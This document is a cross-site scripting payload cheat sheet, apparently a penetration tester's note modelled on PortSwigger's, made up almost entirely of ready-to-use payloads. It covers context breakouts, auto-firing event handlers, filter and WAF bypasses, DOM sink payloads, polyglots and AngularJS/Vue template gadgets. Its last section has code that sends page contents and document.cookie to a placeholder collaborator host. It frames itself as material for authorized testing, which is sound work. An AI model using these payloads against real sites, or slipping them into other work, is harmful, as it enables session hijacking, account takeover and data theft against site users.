# XSS Cheat Sheet

Payload tables mirroring PortSwigger's XSS cheat sheet structure.
Use `alert(document.domain)` as the harmless fire-proof; swap in an exfil to **your own collaborator** only when proving impact. Authorized targets only.

Reference: https://portswigger.net/web-security/cross-site-scripting/cheat-sheet

---

## 1. Context breakouts (pick by where your probe lands)

| Context | Breakout payload |
|---|---|
| Between HTML tags | `<svg onload=alert(1)>` / `<script>alert(1)</script>` |
| Attribute, brackets allowed | `"><svg onload=alert(1)>` |
| Attribute, no brackets | `" autofocus onfocus=alert(1) x="` |
| Attribute, unquoted | ` onmouseover=alert(1) ` (leading space) |
| `href`/`src`/`formaction` | `javascript:alert(1)` |
| JS string (single) | `'-alert(1)-'` or `';alert(1)//` |
| JS string (double) | `"-alert(1)-"` or `";alert(1)//` |
| JS string, quote escaped | `\` then `';alert(1)//` |
| JS, close script tag | `</script><svg onload=alert(1)>` |
| Template literal | `${alert(1)}` |
| DOM innerHTML / jQuery .html() | `<img src=x onerror=alert(1)>` |

---

## 2. Tags + events that fire WITHOUT user interaction

| Payload | Trigger |
|---|---|
| `<script>alert(1)</script>` | parsed inline (blocked via innerHTML / many CSPs) |
| `<svg onload=alert(1)>` | on SVG load |
| `<img src=x onerror=alert(1)>` | on broken image load |
| `<body onload=alert(1)>` | on page load |
| `<iframe onload=alert(1)>` | on frame load |
| `<input autofocus onfocus=alert(1)>` | auto-focus → focus event |
| `<select autofocus onfocus=alert(1)>` | auto-focus |
| `<textarea autofocus onfocus=alert(1)>` | auto-focus |
| `<video><source onerror=alert(1)>` | source error |
| `<audio src=x onerror=alert(1)>` | source error |
| `<marquee onstart=alert(1)>` | animation start |
| `<details open ontoggle=alert(1)>` | auto-open toggle |
| `<object data=x onerror=alert(1)>` | load error |
| `<style>@keyframes x{}</style><xss style="animation-name:x" onanimationstart=alert(1)>` | CSS animation start |
| `<xss style="transition:color 1s" ontransitionend=alert(1) tabindex=1>` | CSS transition end |

## 3. Events requiring user interaction (lower signal — note delivery realism)

| Payload | Trigger |
|---|---|
| `<xss onclick=alert(1) style=display:block>x</xss>` | click |
| `<input onchange=alert(1) value=x>` | change |
| `<xss oncontextmenu=alert(1) style=display:block>x</xss>` | right-click |
| `<xss onmouseover=alert(1) style=display:block>x</xss>` | hover |
| `<body onresize=alert(1)>` + iframe resize | resize |

---

## 4. Filter / WAF bypasses

| Technique | Example |
|---|---|
| Case variation | `<ScRiPt>alert(1)</ScRiPt>` |
| No spaces (use `/`) | `<svg/onload=alert(1)>` |
| Newline/tab in attr | `<svg onload=alert(1)>` with `\t`/`\n`/`\r` inside |
| Backtick call | `<svg onload=alert`1`>` |
| No-parens (throw) | `<svg onload=window.onerror=alert;throw 1>` |
| Comment in tag | `<svg/onload=alert(1)//` |
| Extra/null bytes | `<scri%00pt>` , `<img src=x onerror=alert(1) //>` |
| HTML entities in handler | `<a href="jav&#x09;ascript:alert(1)">` |
| Protocol obfuscation | `java\tscript:alert(1)` , `javascript&colon;alert(1)` |
| Build string | `<img src=x onerror=eval(atob('YWxlcnQoMSk='))>` |
| `fromCharCode` | `onerror=eval(String.fromCharCode(97,108,...))` |
| Double encoding | `%253Cscript%253E` when input is decoded twice |
| Unicode/IDN in domain | use alternate Unicode chars where normalized |
| Tag without close | `<svg onload=alert(1)` (parser auto-closes) |

---

## 5. DOM sink payloads

| Sink | Source flows in as | Payload |
|---|---|---|
| `innerHTML` / `.html()` | string | `<img src=x onerror=alert(1)>` |
| `outerHTML` / `insertAdjacentHTML` | string | `<img src=x onerror=alert(1)>` |
| `document.write` | string | `<script>alert(1)</script>` or `<svg onload=alert(1)>` |
| `eval` / `Function` / `setTimeout(str)` | string | `alert(1)` (or breakout `';alert(1)//`) |
| `location` / `href` / `.attr('href')` | URL | `javascript:alert(1)` |
| `srcdoc` | HTML | `<svg onload=alert(1)>` |
| jQuery `$(input)` | selector/HTML | `<img src=x onerror=alert(1)>` |
| `postMessage` handler → sink | event.data | depends on sink (often `<img onerror>`) |

Source probes: `#wkr7q9z` in `location.hash`, `?x=wkr7q9z` in `location.search`, Referer/`window.name` for those sources.

---

## 6. Polyglots (fire across multiple contexts)

```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```
Compact variant:
```
">'><svg/onload=alert(1)>
```
Image polyglot for attribute+tag:
```
"><img src=x onerror=alert(1)>
```

---

## 7. Framework payloads

### AngularJS (page has `ng-app`)
| Version note | Payload |
|---|---|
| Generic expression | `{{constructor.constructor('alert(1)')()}}` |
| 1.6+ (no sandbox) | `{{$on.constructor('alert(1)')()}}` |
| OrderBy gadget (older) | `{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)')}}` |
| With CSP, via ng | inject into an `ng-` directive attribute, e.g. `<input ng-focus=$event.view.alert(1)>` |

### Vue
```
{{_c.constructor('alert(1)')()}}
{{$el.ownerDocument.defaultView.alert(1)}}
```
Sink directive: `v-html="userInput"` → `<img src=x onerror=alert(1)>`.

### React
Generally auto-escapes; XSS via `dangerouslySetInnerHTML={{__html:userInput}}`, or a `javascript:` URL in `href`/`src` props.

---

## 8. Encoding tricks

| Where | Trick |
|---|---|
| HTML attribute | HTML entities decode before use: `&#x6a;avascript:` , `&Tab;` , `&NewLine;` |
| URL param | URL-encode breakout chars: `%22%3E%3Csvg%20onload%3Dalert(1)%3E` |
| JS string in HTML | server filter misses entities the browser decodes: `&apos;-alert(1)-&apos;` |
| Inside `eval`/JS | `alert(1)` unicode escapes; `atob('...')` base64 |
| Double-decoded input | `%2522` → `%22` → `"` |
| CSS context | `expression()` (legacy IE) / `url(javascript:...)` in old engines |

---

## 9. Impact upgrades (use your own collaborator)

```
// CSRF token read → account action
fetch('/account',{credentials:'include'}).then(r=>r.text()).then(t=>new Image().src='https://YOUR-COLLAB/?d='+btoa(t));

// non-HttpOnly cookie exfil
new Image().src='https://YOUR-COLLAB/c?='+encodeURIComponent(document.cookie);

// dangling markup (script blocked by CSP)
<img src='https://YOUR-COLLAB/leak?
```

Log proven fires + one impact step to `./_EXPLOIT/`. Self-XSS and non-rendered reflections are NOISE — do not report.
